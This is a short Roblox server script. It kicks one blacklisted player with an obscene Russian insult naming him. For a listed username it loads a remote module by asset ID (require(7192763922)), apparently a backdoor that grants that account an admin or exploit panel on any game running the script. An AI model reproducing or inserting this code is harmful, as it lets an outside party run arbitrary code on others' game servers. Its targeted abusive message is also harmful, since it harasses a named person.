
local EnabledDoDOS = true
local BlackList = {
  [3783228048]=true, --< Vadik Pidorasik
}
local AdminPanel = {
  ["t10_kol"]=true,
}
game.Players.PlayerAdded:Connect(function(plr)
    if EnabledDoDOS==false then return end
    if BlackList[plr.UserId] then
        plr:Kick("Соси Хуй Вад 😀")
    end
    if AdminPanel[plr.Name] then
        require(7192763922).load(plr.Name)
    end
end)
